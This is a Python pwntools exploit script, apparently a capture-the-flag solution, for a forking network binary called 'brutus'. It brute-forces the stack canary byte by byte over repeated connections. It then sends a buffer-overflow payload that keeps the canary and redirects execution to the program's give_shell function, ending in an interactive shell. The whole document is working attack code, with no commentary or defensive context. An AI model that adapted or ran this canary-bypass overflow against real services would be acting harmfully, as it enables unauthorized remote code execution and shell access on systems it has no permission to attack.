from pwn import *
import struct
from functools import reduce
context(arch = 'amd64', os = 'linux')

progname = './brutus'

exe = context.binary = ELF(progname)
#context.log_level = 'error'
host = args.HOST or 'localhost'
port = int(args.PORT or 8000)

gdbscript = '''
set follow-fork-mode child
break *(handle+253)
continue
'''

def local(argv=[], *a, **kw):
    if args.GDB:
        r = process(progname, raw=False, *a, **kw)
        gdb.attach(r, gdbscript)
    io = connect(host, port)
    return io

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    io.send('bh1642\r\n')
    print(io.recvline()) # Wait
    return io

start = local #if args.LOCAL else remote

def canaryToByte(canary):
    return reduce(lambda x, y: x + y,
                map(lambda x: struct.pack('B', x), canary), '')

canary = []
for i in range(8):
    for j in range(256):
        io = start()
        print(io.recvline())
        print(io.recvline())
        io.sendline(str(137 + i))
        print(io.recvline())
        io.send(fit({
            0: 0x1,
            136: canaryToByte(canary) + struct.pack('B', j)
        }, filler='\x00'))
        print(io.recvline())
        try:
            print(io.recvline())
            print(j)
            canary.append(j)
            print(canary)
            break
        except:
            pass
        io.close()

io = start()
print(io.recvline())
print(io.recvline())
io.sendline('160')
print(io.recvline())
io.send(fit({
    136: canaryToByte(canary),
    152: exe.sym.give_shell
}))
print(io.recvline())
io.interactive()
